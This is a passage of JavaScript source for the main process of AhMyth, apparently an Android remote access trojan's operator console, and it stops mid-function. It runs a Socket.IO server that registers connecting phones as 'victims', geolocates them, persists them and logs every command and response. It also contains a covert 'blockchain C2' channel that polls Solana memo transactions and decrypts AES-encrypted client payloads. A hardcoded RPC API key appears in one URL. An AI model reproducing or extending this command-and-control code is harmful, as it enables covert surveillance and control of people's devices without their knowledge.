const { app, BrowserWindow, dialog, systemPreferences } = require('electron')
require('@electron/remote/main').initialize()
const electron = require('electron');
const { ipcMain } = require('electron');
const http = require('http');
var io = require('socket.io');
var geoip = require('geoip-lite');
var fs = require('fs');
var path = require('path');
var victimsList = require('./app/assets/js/model/Victim');
module.exports = victimsList;

// Set persistence path for victims
const victimsPersistencePath = path.join(app.getPath('userData'), 'victims.json');
victimsList.setPersistencePath(victimsPersistencePath);

// Load environment variables
require('dotenv').config();

// Transcription service
const transcriptionService = require('./transcription-service');

// Blockchain C2 service (lazy load to avoid errors if not configured)
let blockchainC2Generator = null;
let blockchainC2Server = null;
try {
  blockchainC2Generator = require('./src/c2/blockchain_c2_generator');
  blockchainC2Server = require('./src/c2/blockchain_c2_server');
} catch (e) {
  console.warn('[Main] Blockchain C2 modules not available:', e.message);
}

//--------------------------------------------------------------
let win;
let display;
var windows = {};
var fullscreenWindows = {}; // Map fullscreen window ID to parent window webContents ID
const IOs = {};
const IOHttpServers = {};
const AUTO_LISTEN_PORT = process.env.AHMYTH_AUTO_LISTEN_PORT
  ? parseInt(process.env.AHMYTH_AUTO_LISTEN_PORT, 10)
  : null;
//--------------------------------------------------------------

// Log file setup
const logDir = path.join(app.getPath('userData'), 'logs');
if (!fs.existsSync(logDir)) {
  fs.mkdirSync(logDir, { recursive: true });
}
const logFile = path.join(logDir, `ahmyth-${new Date().toISOString().split('T')[0]}.log`);

// Debug log file (for instrumentation)
const debugLogPath = path.join(__dirname, '..', '..', '.cursor', 'debug.log');
const debugLogDir = path.dirname(debugLogPath);
if (!fs.existsSync(debugLogDir)) {
  fs.mkdirSync(debugLogDir, { recursive: true });
}

// Write to log file
function writeToLogFile(level, msg) {
  const timestamp = new Date().toISOString();
  const logEntry = `[${timestamp}] [${level}] ${msg}\n`;
  fs.appendFileSync(logFile, logEntry);
}

// Debug instrumentation removed
// No-op stub to avoid runtime errors after instrumentation cleanup
function writeDebugLog(logData) {
  // intentionally left blank
}

const LOG_COLORS = {
  reset: '\x1b[0m',
  info: '\x1b[36m',
  success: '\x1b[32m',
  warn: '\x1b[33m',
  error: '\x1b[31m',
  request: '\x1b[35m',
  response: '\x1b[35m'
};

const formatLogLine = (level, msg) => `[AhMyth] [${level.toUpperCase()}] ${new Date().toISOString()} - ${msg}`;

const colorize = (level, text) => {
  const color = LOG_COLORS[level] || LOG_COLORS.info;
  return `${color}${text}${LOG_COLORS.reset}`;
};

const log = {
  writeConsole(level, msg, stream = console.log) {
    stream(colorize(level, formatLogLine(level, msg)));
  },
  info(msg) {
    this.writeConsole('info', msg, console.log);
    writeToLogFile('INFO', msg);
  },
  success(msg) {
    this.writeConsole('success', msg, console.log);
    writeToLogFile('SUCCESS', msg);
  },
  error(msg) {
    this.writeConsole('error', msg, console.error);
    writeToLogFile('ERROR', msg);
  },
  warn(msg) {
    this.writeConsole('warn', msg, console.warn);
    writeToLogFile('WARN', msg);
  },
  request(deviceId, command, data) {
    const payload = data ? JSON.stringify(data).substring(0, 500) : '';
    const msg = `REQUEST to ${deviceId}: ${command} ${payload}`;
    this.writeConsole('request', msg, console.log);
    writeToLogFile('REQUEST', msg);
  },
  response(deviceId, command, data) {
    const dataStr = data ? JSON.stringify(data) : '';
    const truncated = dataStr.length > 1000 ? `${dataStr.substring(0, 1000)}...[truncated]` : dataStr;
    const msg = `RESPONSE from ${deviceId}: ${command} (${dataStr.length} bytes) ${truncated}`;
    this.writeConsole('response', msg, console.log);
    writeToLogFile('RESPONSE', msg);
  }
};

// Check system permissions on startup
async function checkSystemPermissions() {
  log.info('Checking system permissions...');
  
  const permissions = [];
  
  // Check microphone access (for future features)
  if (process.platform === 'darwin') {
    const micStatus = systemPreferences.getMediaAccessStatus('microphone');
    permissions.push({ name: 'Microphone', status: micStatus });
    
    const cameraStatus = systemPreferences.getMediaAccessStatus('camera');
    permissions.push({ name: 'Camera', status: cameraStatus });
    
    if (micStatus === 'not-determined') {
      log.info('Requesting microphone permission...');
      await systemPreferences.askForMediaAccess('microphone');
    }
    
    if (cameraStatus === 'not-determined') {
      log.info('Requesting camera permission...');
      await systemPreferences.askForMediaAccess('camera');
    }
  }
  
  // Check network permissions
  log.info('Network permissions: granted (required for socket connections)');
  permissions.push({ name: 'Network', status: 'granted' });
  
  // Check file system permissions
  log.info('File system permissions: granted (required for APK building)');
  permissions.push({ name: 'File System', status: 'granted' });
  
  log.success('Permission check completed');
  return permissions;
}

// Display startup information
function displayStartupInfo() {
  console.log('\n');
  console.log('╔══════════════════════════════════════════════════════════════╗');
  console.log('║                                                              ║');
  console.log('║     █████╗ ██╗  ██╗███╗   ███╗██╗   ██╗████████╗██╗  ██╗    ║');
  console.log('║    ██╔══██╗██║  ██║████╗ ████║╚██╗ ██╔╝╚══██╔══╝██║  ██║    ║');
  console.log('║    ███████║███████║██╔████╔██║ ╚████╔╝    ██║   ███████║    ║');
  console.log('║    ██╔══██║██╔══██║██║╚██╔╝██║  ╚██╔╝     ██║   ██╔══██║    ║');
  console.log('║    ██║  ██║██║  ██║██║ ╚═╝ ██║   ██║      ██║   ██║  ██║    ║');
  console.log('║    ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝     ╚═╝   ╚═╝      ╚═╝   ╚═╝  ╚═╝    ║');
  console.log('║                                                              ║');
  console.log('║              Android Remote Administration Tool              ║');
  console.log('║                         Version 2.5                          ║');
  console.log('║                                                              ║');
  console.log('╚══════════════════════════════════════════════════════════════╝');
  console.log('\n');
  log.info(`Platform: ${process.platform}`);
  log.info(`Architecture: ${process.arch}`);
  log.info(`Electron Version: ${process.versions.electron}`);
  log.info(`Node Version: ${process.versions.node}`);
  console.log('\n');
}

function createWindow() {
  displayStartupInfo();

  // get Display Sizes ( x , y , width , height)
  display = electron.screen.getPrimaryDisplay();
  log.info(`Display size: ${display.bounds.width}x${display.bounds.height}`);

  //------------------------SPLASH SCREEN INIT------------------------------------
  // create the splash window
  let splashWin = new BrowserWindow({
    width: 700,
    height: 500,
    frame: false,
    transparent: true,
    icon: __dirname + '/app/assets/img/icon.png',
    type: "splash",
    alwaysOnTop: true,
    show: false,
    position: "center",
    resizable: false,
    toolbar: false,
    fullscreen: false,
    webPreferences: {
      nodeIntegration: true,
      enableRemoteModule: true,
      contextIsolation: false
    }
  });

  require('@electron/remote/main').enable(splashWin.webContents);

  log.info('Loading splash screen...');
  splashWin.loadFile(__dirname + '/app/splash.html');

  splashWin.webContents.on('did-finish-load', function () {
    splashWin.show();
    log.success('Splash screen displayed');
  });

  splashWin.on('closed', () => {
    splashWin = null
  })


  //------------------------Main SCREEN INIT------------------------------------
  // Create the browser window.
  win = new BrowserWindow({
    icon: __dirname + '/app/assets/img/icon.png',
    width: 1100,
    height: 750,
    minWidth: 900,
    minHeight: 650,
    show: false,
    resizable: true,
    position: "center",
    toolbar: false,
    fullscreen: false,
    frame: false,
    backgroundColor: '#0d1117',
    webPreferences: {
      nodeIntegration: true,
      enableRemoteModule: true,
      contextIsolation: false
    }
  });

  require('@electron/remote/main').enable(win.webContents);

  log.info('Loading main window...');
  win.loadFile(__dirname + '/app/index.html');
  
  // Uncomment to open dev tools for debugging
  win.webContents.openDevTools()

  win.on('closed', () => {
    log.info('Main window closed');
    win = null
  })

  // Emitted when the window is finished loading.
  win.webContents.on('did-finish-load', async function () {
    log.success('Main window loaded');
    
    // Check permissions
    await checkSystemPermissions();
    
    setTimeout(() => {
      if (splashWin) {
        splashWin.close();
      }
      win.show();
      log.success('Application ready');
      
      // Restore persisted offline victims to renderer (after window is shown)
      setTimeout(() => {
        try {
          if (!victimsList || typeof victimsList.getAllVictims !== 'function') {
            log.warn('VictimsList not ready, skipping offline victim restoration');
            return;
          }
          
          const allVictims = victimsList.getAllVictims();
          if (!allVictims || typeof allVictims !== 'object') {
            log.warn('No victims found to restore');
            return;
          }
          
          const offlineVictims = Object.entries(allVictims).filter(([id, victim]) => {
            return victim && !victim.isOnline;
          });
          
          if (offlineVictims.length > 0) {
            log.info(`Restoring ${offlineVictims.length} persisted offline victim(s)`);
            // Send a special event to restore offline victims
            if (win && win.webContents && !win.webContents.isDestroyed()) {
              win.webContents.send('Victims:RestoreOffline', offlineVictims.map(([id, victim]) => ({ 
                id, 
                victim: {
                  ...victim,
                  id: id // Ensure ID is included
                }
              })));
            }
          }
        } catch (e) {
          log.error(`Failed to restore offline victims: ${e.message}`);
          log.error(e.stack);
        }
      }, 2000); // Increased delay to ensure renderer is fully ready

      // Optional auto-start of the Socket.IO server for headless automation
      maybeAutoStartSocketServer();
    }, 2000);
  });
}



// This method will be called when Electron has finished
// initialization and is ready to create browser windows.
app.on('ready', async () => {
  log.info('Electron app ready');
  
  // Initialize transcription service
  log.info('Initializing transcription service...');
  const transcriptionInitialized = await transcriptionService.initializeTranscription();
  if (transcriptionInitialized) {
    log.success('Transcription service initialized');
  } else {
    log.warn('Transcription service not available (model may need to be downloaded)');
    log.warn('Download from: https://alphacephei.com/vosk/models');
    log.warn('Recommended: vosk-model-small-en-us-0.15 (39MB)');
  }
  
  // Load blockchain C2 config
  if (blockchainC2Generator) {
    try {
      const blockchainConfig = blockchainC2Generator.loadConfig();
      if (blockchainConfig && blockchainConfig.enabled) {
        log.info('Blockchain C2 is enabled');
        log.info(`RPC URL: ${blockchainConfig.rpc_url}`);
      } else {
        log.info('Blockchain C2 is disabled (configure in Settings tab)');
      }
    } catch (e) {
      log.warn('Blockchain C2 config not available');
    }
  }
  
  createWindow();
})

// Cleanup all servers before quitting
function cleanupAllServers() {
  log.info('Cleaning up all servers...');
  for (const port in IOs) {
    if (IOs[port]) {
      try {
        IOs[port].sockets.sockets.forEach((socket) => {
          socket.disconnect(true);
        });
        IOs[port].close();
        IOs[port] = null;
      } catch (e) {
        log.error(`Error closing Socket.IO server on port ${port}: ${e.message}`);
      }
    }
  }
  for (const port in IOHttpServers) {
    if (IOHttpServers[port]) {
      try {
        IOHttpServers[port].close();
        IOHttpServers[port] = null;
      } catch (e) {
        log.error(`Error closing HTTP server on port ${port}: ${e.message}`);
      }
    }
  }
  // Clear all status
  Object.keys(listeningStatus).forEach(port => {
    listeningStatus[port] = false;
  });
  log.info('All servers cleaned up');
}

// Cleanup before quitting
app.on('before-quit', (event) => {
  log.info('App is quitting, cleaning up servers...');
  cleanupAllServers();
});

// Quit when all windows are closed.
app.on('window-all-closed', () => {
  log.info('All windows closed');
  cleanupAllServers();
  if (process.platform !== 'darwin') {
    app.quit()
  }
})

app.on('activate', () => {
  if (win === null) {
    createWindow()
  }
})



//handle the Uncaught Exceptions




const listeningStatus = {}; // Object to track listening status for each port

function maybeAutoStartSocketServer() {
  if (!AUTO_LISTEN_PORT || Number.isNaN(AUTO_LISTEN_PORT)) {
    return;
  }

  if (listeningStatus[AUTO_LISTEN_PORT]) {
    log.info(`[AUTO LISTEN] Socket.IO already active on port ${AUTO_LISTEN_PORT}`);
    return;
  }

  log.info(`[AUTO LISTEN] Starting Socket.IO server on port ${AUTO_LISTEN_PORT}`);
  const autoEvent = {
    reply: (channel, message) => {
      log.info(`[AUTO LISTEN] ${channel}: ${message}`);
    }
  };

  ipcMain.emit('SocketIO:Listen', autoEvent, AUTO_LISTEN_PORT);
}

ipcMain.on('SocketIO:Listen', function (event, port) {
  log.info(`Attempting to start server on port ${port}...`);
  
  // Check if port is already listening
  if (listeningStatus[port] && IOs[port]) {
    log.warn(`Port ${port} is already in use`);
    event.reply('SocketIO:ListenError', `[✗] Already listening on port ${port}`);
    return;
  }
  
  // Clean up any stale references
  if (IOs[port]) {
    try {
      IOs[port].close();
      IOs[port] = null;
    } catch (e) {}
  }
  if (IOHttpServers[port]) {
    try {
      IOHttpServers[port].close();
      IOHttpServers[port] = null;
    } catch (e) {}
  }
  listeningStatus[port] = false;

  try {
    // Explicitly bind to all interfaces so connections work outside localhost
    const server = http.createServer();
    
    // Handle server errors
    server.on('error', (err) => {
      if (err.code === 'EADDRINUSE') {
        log.error(`Port ${port} is already in use by another process`);
        listeningStatus[port] = false;
        IOs[port] = null;
        IOHttpServers[port] = null;
        event.reply('SocketIO:ListenError', `[✗] Port ${port} is already in use. Try stopping any other instances or use a different port.`);
      } else {
        log.error(`Server error on port ${port}: ${err.message}`);
        listeningStatus[port] = false;
        IOs[port] = null;
        IOHttpServers[port] = null;
        event.reply('SocketIO:ListenError', `[✗] Server error: ${err.message}`);
      }
    });
    
    server.listen(port, '0.0.0.0', () => {
      log.success(`HTTP server listening on port ${port}`);

    // Socket.IO v4 initialization
    IOs[port] = require('socket.io')(server, {
      cors: {
        origin: "*",
        methods: ["GET", "POST"]
      },
      pingInterval: 25000,
      pingTimeout: 20000,
      connectTimeout: 45000,
      maxHttpBufferSize: 1e8, // 100 MB
      allowEIO3: true // Allow Engine.IO v3 clients (like Android socket.io-client 1.x/2.x)
    });
    IOHttpServers[port] = server;

      log.success(`Socket.IO server started on port ${port}`);

      // Only mark as listening after server successfully starts
      listeningStatus[port] = true;
      
      // Set up connection handler AFTER server is ready
    IOs[port].sockets.on('connection', function (socket) {
      var address = socket.request.connection;
      var query = socket.handshake.query;
      var index = query.id;
      var ip = address.remoteAddress.substring(address.remoteAddress.lastIndexOf(':') + 1);
      var country = null;
      
      // Check if it's a local/private IP
      const isLocalIP = ip === '127.0.0.1' || 
                        ip === 'localhost' ||
                        ip.startsWith('10.') || 
                        ip.startsWith('192.168.') || 
                        ip.startsWith('172.16.') ||
                        ip.startsWith('172.17.') ||
                        ip.startsWith('172.18.') ||
                        ip.startsWith('172.19.') ||
                        ip.startsWith('172.2') ||
                        ip.startsWith('172.3');
      
      // Operator to country code mapping (MCC-based detection)
      const operatorCountryMap = {
        // Common operators by country
        'vodafone': 'gb', 'o2': 'gb', 'ee': 'gb', 'three': 'gb',
        'at&t': 'us', 'verizon': 'us', 't-mobile': 'us', 'sprint': 'us',
        'rogers': 'ca', 'bell': 'ca', 'telus': 'ca',
        'telstra': 'au', 'optus': 'au',
        'orange': 'fr', 'sfr': 'fr', 'bouygues': 'fr', 'free': 'fr',
        'deutsche telekom': 'de', 'o2 de': 'de', 'vodafone de': 'de',
        'tim': 'it', 'wind': 'it', 'vodafone it': 'it',
        'movistar': 'es', 'vodafone es': 'es', 'orange es': 'es',
        'swisscom': 'ch', 'sunrise': 'ch', 'salt': 'ch',
        'kpn': 'nl', 't-mobile nl': 'nl', 'vodafone nl': 'nl',
        'proximus': 'be', 'orange be': 'be', 'base': 'be',
        'a1': 'at', 'drei': 'at', 't-mobile at': 'at',
        'telenor': 'no', 'telia': 'se', 'tele2': 'se',
        'play': 'pl', 'plus': 'pl', 'orange pl': 'pl', 't-mobile pl': 'pl', 'nju': 'pl', 'nju mobile': 'pl',
        'mts': 'ru', 'megafon': 'ru', 'beeline': 'ru',
        'china mobile': 'cn', 'china unicom': 'cn', 'china telecom': 'cn',
        'ntt docomo': 'jp', 'softbank': 'jp', 'au': 'jp', 'kddi': 'jp',
        'sk telecom': 'kr', 'kt': 'kr', 'lg u+': 'kr',
        'airtel': 'in', 'jio': 'in', 'vodafone in': 'in', 'bsnl': 'in',
        'claro': 'br', 'vivo': 'br', 'oi': 'br', 'tim br': 'br',
        'telcel': 'mx', 'movistar mx': 'mx', 'at&t mx': 'mx',
        'etisalat': 'ae', 'du': 'ae',
        'stc': 'sa', 'mobily': 'sa', 'zain': 'sa',
        'mtn': 'za', 'vodacom': 'za', 'cell c': 'za',
        'safaricom': 'ke', 'airtel ke': 'ke',
        'globe': 'ph', 'smart': 'ph', 'sun': 'ph',
        'singtel': 'sg', 'starhub': 'sg', 'm1': 'sg',
        'maxis': 'my', 'digi': 'my', 'celcom': 'my',
        'ais': 'th', 'dtac': 'th', 'true': 'th',
        'indosat': 'id', 'telkomsel': 'id', 'xl': 'id',
        'viettel': 'vn', 'mobifone': 'vn', 'vinaphone': 'vn'
      };
      
      // Function to guess country from operator
      const getCountryFromOperator = (operator) => {
        if (!operator) return null;
        const opLower = operator.toLowerCase().trim();
        for (const [key, code] of Object.entries(operatorCountryMap)) {
          if (opLower.includes(key)) return code;
        }
        return null;
      };
      
      if (isLocalIP) {
        log.info(`Local/private IP detected: ${ip}`);
        // Try to get country from operator info
        const operatorCountry = getCountryFromOperator(query.operator);
        if (operatorCountry) {
          country = operatorCountry;
          log.info(`Country detected from operator "${query.operator}": ${country.toUpperCase()}`);
        } else {
          // Default to showing local network icon
          country = 'local';
          log.info(`No country detected - using local network indicator`);
        }
      } else {
        var geo = geoip.lookup(ip);
        if (geo) {
          country = geo.country.toLowerCase();
          log.info(`GeoIP lookup: ${ip} -> ${geo.country} (${geo.city || 'Unknown city'})`);
        } else {
          // Fallback to operator
          const operatorCountry = getCountryFromOperator(query.operator);
          if (operatorCountry) {
            country = operatorCountry;
            log.info(`GeoIP failed, using operator "${query.operator}": ${country.toUpperCase()}`);
          } else {
            log.warn(`GeoIP lookup failed for IP: ${ip}`);
          }
        }
      }

      log.success(`New connection from ${ip}:${address.remotePort}`);
      log.info(`Device: ${query.manf} ${query.model} (Android ${query.release})`);
      log.info(`Device ID: ${query.id}`);
      if (query.battery) log.info(`Battery: ${query.battery}%`);
      if (query.operator) log.info(`Operator: ${query.operator}`);

      // Check if device already exists, and if so, disconnect the old socket
      const existingVictim = victimsList.getVictim(index);
      if (existingVictim && existingVictim.socket) {
        log.warn(`Device ${index} is reconnecting. Disconnecting old socket.`);
        existingVictim.socket.disconnect(true); // Force disconnect
        victimsList.rmVictim(index); // Remove old entry
      }

      // Extra device info from query params
      const extraInfo = {
        sdk: query.sdk,
        battery: query.battery,
        operator: query.operator,
        device: query.device,
        brand: query.brand,
        product: query.product
      };

      // Add the victim to victimList
      victimsList.addVictim(socket, ip, address.remotePort, country, query.manf, query.model, query.release, query.id, extraInfo);


      //------------------------Notification SCREEN INIT------------------------------------
      // create the Notification window
      let notification = new BrowserWindow({
        frame: false,
        x: display.bounds.width - 320,
        y: display.bounds.height - 100,
        show: false,
        width: 300,
        height: 80,
        resizable: false,
        toolbar: false,
        alwaysOnTop: true,
        skipTaskbar: true,
        transparent: true,
        webPreferences: {
          nodeIntegration: true,
          enableRemoteModule: true,
          contextIsolation: false
        }
      });
      
      require('@electron/remote/main').enable(notification.webContents);

      // Emitted when the window is finished loading.
      notification.webContents.on('did-finish-load', function () {
        notification.show();
        setTimeout(function () {
          if (notification && !notification.isDestroyed()) {
            notification.destroy()
          }
        }, 3000);
      });

      notification.webContents.victim = victimsList.getVictim(index);
      notification.loadFile(__dirname + '/app/notification.html');



      //notify renderer proccess (AppCtrl) about the new Victim
      win.webContents.send('SocketIO:NewVictim', index);

      // Helper function to send logs to GUI
      const sendLogToGUI = (type, event, data) => {
        if (win && win.webContents) {
          try {
            let dataStr = '';
            if (data) {
              if (typeof data === 'string') {
                dataStr = data;
              } else {
                try {
                  dataStr = JSON.stringify(data, null, 2);
                } catch (e) {
                  dataStr = String(data);
                }
              }
            }
            // Truncate very long data
            if (dataStr.length > 5000) {
              dataStr = dataStr.substring(0, 5000) + '...[truncated]';
            }
            win.webContents.send(`log:${type}`, {
              deviceId: index,
              command: event,
              data: dataStr
            });
          } catch (e) {
            // Ignore serialization errors
          }
        }
      };

      // Wrap socket.emit to log all requests
      const originalEmit = socket.emit.bind(socket);
      socket.emit = function(event, data) {
        log.request(index, event, data);
        sendLogToGUI('request', event, data);
        return originalEmit(event, data);
      };
      
      // Wrap socket.on to log all responses
      // We need to wrap handlers as they're registered
      const originalOn = socket.on.bind(socket);
      socket.on = function(event, callback) {
        // Wrap the callback to log responses
        const wrappedCallback = function(data) {
          log.response(index, event, data);
          sendLogToGUI('response', event, data);
          // Call original callback
          if (callback && typeof callback === 'function') {
            return callback(data);
          }
        };
        return originalOn(event, wrappedCallback);
      };

      // Handle battery updates from client
      socket.on('x0000bt', function(data) {
        try {
          const batteryData = typeof data === 'string' ? JSON.parse(data) : data;
          if (batteryData && batteryData.level !== undefined) {
            victimsList.updateVictim(index, { battery: parseInt(batteryData.level) });
            win.webContents.send('SocketIO:BatteryUpdate', { id: index, battery: parseInt(batteryData.level) });
          }
        } catch (e) {
          log.error(`Error parsing battery data: ${e.message}`);
        }
      });

      // Request battery update every 30 seconds
      const batteryInterval = setInterval(() => {
        if (socket.connected) {
          socket.emit('order', { order: 'x0000bt' });
        } else {
          clearInterval(batteryInterval);
        }
      }, 30000);

      socket.on('disconnect', function () {
        log.info(`Victim disconnected: ${ip} (${query.manf} ${query.model})`);
        clearInterval(batteryInterval);
        
        // Set victim as offline instead of removing
        victimsList.setOffline(index);

        //notify renderer proccess (AppCtrl) about the disconnected Victim (now offline)
        win.webContents.send('SocketIO:VictimOffline', index);

        if (windows[index]) {
          try {
            const labWindow = BrowserWindow.fromId(windows[index]);
            if (labWindow && !labWindow.isDestroyed()) {
              labWindow.webContents.send("SocketIO:VictimDisconnected");
            }
          } catch (e) {
            log.error(`Error notifying lab window: ${e.message}`);
          }
          delete windows[index]
        }

        //notify renderer proccess (LabCtrl) if opened about the Server Disconnecting
        if (windows[index]) {
          try {
            const labWindow = BrowserWindow.fromId(windows[index]);
            if (labWindow && !labWindow.isDestroyed()) {
              labWindow.webContents.send("SocketIO:ServerDisconnected");
            }
          } catch (e) {
            log.error(`Error notifying lab window: ${e.message}`);
          }
          delete windows[index]
        }
      });
    }); // End of IOs[port].sockets.on('connection')

      // Reply after everything is set up
    event.reply('SocketIO:Listen', `[✓] Server started on port ${port}`);
    }); // End of server.listen callback
    
  } catch (error) {
    log.error(`Failed to start server: ${error.message}`);
    event.reply('SocketIO:ListenError', `[✗] Failed to start server: ${error.message}`);
  }
});

ipcMain.on('SocketIO:Stop', function (event, port) {
  log.info(`Stopping server on port ${port}...`);
  
  if (IOs[port]) {
    try {
      const ioServer = IOs[port];
      const httpServer = IOHttpServers[port];
      
      // Close all socket connections first
      ioServer.sockets.sockets.forEach((socket) => {
        socket.disconnect(true);
      });
      
      // Close Socket.IO server
      ioServer.close(() => {
        log.info(`Socket.IO server closed for port ${port}`);
      });
      
      // Close HTTP server with callback to ensure it's fully closed
      if (httpServer) {
        httpServer.close(() => {
          log.info(`HTTP server closed for port ${port}`);
          // Clear references after a short delay to ensure port is released
          setTimeout(() => {
      IOs[port] = null;
            IOHttpServers[port] = null;
            listeningStatus[port] = false;
          }, 100);
        });
        
        // Force close if still open after 2 seconds
        setTimeout(() => {
      if (IOHttpServers[port]) {
            try {
        IOHttpServers[port].close();
            } catch (e) {}
        IOHttpServers[port] = null;
      }
          if (IOs[port]) {
            IOs[port] = null;
          }
      listeningStatus[port] = false;
        }, 2000);
      } else {
        IOs[port] = null;
        listeningStatus[port] = false;
      }
      
      log.success(`Server stopped on port ${port}`);
      event.reply('SocketIO:Stop', `[✓] Server stopped on port ${port}`);
    } catch (error) {
      log.error(`Error stopping server: ${error.message}`);
      // Force cleanup on error
      IOs[port] = null;
      IOHttpServers[port] = null;
      listeningStatus[port] = false;
      event.reply('SocketIO:StopError', `[✗] Error stopping server: ${error.message}`);
    }
  } else {
    log.warn(`No server running on port ${port}`);
    // Clear status anyway
    listeningStatus[port] = false;
    event.reply('SocketIO:Stop', `[ℹ] Port ${port} was not active`);
  }
});

// ============================================================
// Blockchain C2 Listener
// ============================================================
let blockchainPollerInterval = null;
let blockchainListening = false;
let blockchainSeenSignatures = new Set();
const blockchainVictims = new Set(); // Track known blockchain client IDs

// Load blockchain dependencies
let bs58Main, ConnectionMain, PublicKeyMain, cryptoMain;
try {
  bs58Main = require('bs58');
  const solanaWeb3 = require('@solana/web3.js');
  ConnectionMain = solanaWeb3.Connection;
  PublicKeyMain = solanaWeb3.PublicKey;
  cryptoMain = require('crypto');
} catch (e) {
  log.warn('[Blockchain] Dependencies not available:', e.message);
}

function decryptMemoPayloadMain(hexPayload, aesKeyHex) {
  if (!cryptoMain || !aesKeyHex) return null;
  try {
    const buf = Buffer.from(hexPayload, 'hex');
    if (buf.length < 28) return null;
    const iv = buf.slice(0, 12);
    const tag = buf.slice(-16);
    const ciphertext = buf.slice(12, -16);
    const key = Buffer.from(aesKeyHex, 'hex');
    const decipher = cryptoMain.createDecipheriv('aes-256-gcm', key, iv);
    decipher.setAuthTag(tag);
    let decrypted = decipher.update(ciphertext);
    decrypted = Buffer.concat([decrypted, decipher.final()]);
    return decrypted.toString('utf8');
  } catch (e) {
    return null;
  }
}

function extractMemosFromTxMain(tx) {
  const memos = [];
  if (!tx || !tx.transaction || !tx.transaction.message) return memos;
  const msg = tx.transaction.message;
  
  // Handle both parsed (objects with pubkey) and raw (strings) account keys
  const accounts = msg.accountKeys || [];
  const getAccountPubkey = (acc) => {
    if (typeof acc === 'string') return acc;
    if (acc && typeof acc === 'object') {
      if (acc.pubkey) return typeof acc.pubkey === 'string' ? acc.pubkey : acc.pubkey.toBase58?.() || String(acc.pubkey);
      if (acc.toBase58) return acc.toBase58();
    }
    return String(acc);
  };
  
  const memoProgram = 'MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr';
  const memoProgramAlt = 'Memo1UhkJRfHyvLMcVucJwxXeuD728EqVDDwQDxFMNo'; // Old memo program
  
  const processMemoInstruction = (ix) => {
    let progId = null;
    if (ix.programId) {
      progId = typeof ix.programId === 'string' ? ix.programId : ix.programId.toBase58?.() || String(ix.programId);
    } else if (typeof ix.programIdIndex === 'number' && accounts[ix.programIdIndex]) {
      progId = getAccountPubkey(accounts[ix.programIdIndex]);
    }
    if (progId === memoProgram || progId === memoProgramAlt) {
      if (ix.parsed && typeof ix.parsed === 'string') {
        memos.push(ix.parsed);
      } else if (ix.data) {
        try {
          memos.push(Buffer.from(ix.data, 'base64').toString('utf8'));
        } catch {}
      }
    }
  };
  
  // Check main instructions
  const instructions = msg.instructions || [];
  for (const ix of instructions) {
    processMemoInstruction(ix);
  }
  
  // Also check inner instructions (for transactions with nested calls)
  if (tx.meta && tx.meta.innerInstructions) {
    for (const inner of tx.meta.innerInstructions) {
      if (inner.instructions) {
        for (const ix of inner.instructions) {
          processMemoInstruction(ix);
        }
      }
    }
  }
  
  // Also check log messages for memo content (backup method)
  if (tx.meta && tx.meta.logMessages) {
    for (const logMsg of tx.meta.logMessages) {
      // Memos often appear in logs as "Program log: Memo (len X): ..."
      const memoMatch = logMsg.match(/Program log: Memo \(len \d+\): "?(.+?)"?$/);
      if (memoMatch) {
        const memoContent = memoMatch[1];
        if (!memos.includes(memoContent)) {
          memos.push(memoContent);
        }
      }
    }
  }
  
  return memos;
}

// Chunk buffers for assembling multi-part responses
const blockchainChunkBuffers = new Map();

// Track RPC rate limits and rotation
let rpcRateLimitMap = new Map(); // rpc -> { last429: timestamp, consecutive429s: count }
let currentRpcIndex = 0;
let lastPollTime = 0;
const MIN_POLL_INTERVAL = 15000; // Minimum 15 seconds between polls
let blockchainListenerStartTime = 0; // When listener started - ignore old transactions
let pollCycleCount = 0;

async function pollBlockchainForClients(config) {
  if (!ConnectionMain || !PublicKeyMain || !config.channelAddress || !config.aesKey) {
    log.warn('[Blockchain] Poll skipped - missing dependencies or config');
    return;
  }
  
  const sendBlockchainLog = (msg) => {
    if (win && win.webContents) {
      win.webContents.send('Blockchain:Log', msg);
    }
  };
  
  // Add delay to prevent rate limiting
  const now = Date.now();
  const timeSinceLastPoll = now - lastPollTime;
  if (timeSinceLastPoll < MIN_POLL_INTERVAL) {
    await new Promise(resolve => setTimeout(resolve, MIN_POLL_INTERVAL - timeSinceLastPoll));
  }
  lastPollTime = Date.now();
  pollCycleCount++;
  
  // Build RPC list with public fallbacks
  const rpcUrls = [
    config.rpcUrl,
    ...(config.rpcFallbacks ? config.rpcFallbacks.split(',').map(s => s.trim()) : []),
    'https://api.devnet.solana.com',
    'https://api.testnet.solana.com',
    'https://rpc.ankr.com/solana_devnet',
    'https://devnet.helius-rpc.com/?api-key=1587a8d0-6581-451d-93a8-4221147748d3'
  ].filter(Boolean).filter(url => !url.includes('alchemy') && !url.includes('ankr.com')); // Filter out demo keys and unstable ones
  
  // Rotate RPCs - skip rate-limited ones
  const availableRpcs = rpcUrls.filter(rpc => {
    const rateLimit = rpcRateLimitMap.get(rpc);
    if (!rateLimit) return true;
    // If last 429 was more than 60 seconds ago, try again
    if (Date.now() - rateLimit.last429 > 60000) {
      rateLimit.consecutive429s = 0;
      return true;
    }
    // Skip if too many consecutive 429s
    return rateLimit.consecutive429s < 5;
  });
  
  if (availableRpcs.length === 0) {
    sendBlockchainLog(`[⚠] All RPCs rate-limited, waiting...`);
    // Reset all after 60 seconds
    rpcRateLimitMap.clear();
    return;
  }
  
  // Rotate through available RPCs
  const rpc = availableRpcs[currentRpcIndex % availableRpcs.length];
  currentRpcIndex++;

  if (pollCycleCount % 4 === 0) {
     sendBlockchainLog(`[↻] Polling blockchain channel... (${rpc.substring(8, 25)}...)`);
  }
  
  try {
    const connection = new ConnectionMain(rpc, 'confirmed');
    const channelPubkey = new PublicKeyMain(config.channelAddress);
    
    const sigInfos = await connection.getSignaturesForAddress(channelPubkey, { limit: 20 }, 'confirmed');
    
    // Clear rate limit on success
    if (rpcRateLimitMap.has(rpc)) {
      rpcRateLimitMap.delete(rpc);
    }
    
    // Count how many are new (not skipped)
    let newTxCount = 0;
    let skippedOldCount = 0;
    for (const info of sigInfos) {
      if (!info || !info.signature) continue;
      if (blockchainSeenSignatures.has(info.signature)) continue;
      if (info.blockTime && blockchainListenerStartTime > 0) {
        const txTimeMs = info.blockTime * 1000;
        // 5 minute grace period
        if (txTimeMs < (blockchainListenerStartTime - 300000)) {
          skippedOldCount++;
          continue;
        }
      }
      newTxCount++;
    }
    
    if (newTxCount > 0) {
      sendBlockchainLog(`[✓] RPC: ${rpc.substring(8, 25)}... | ${newTxCount} new tx to check`);
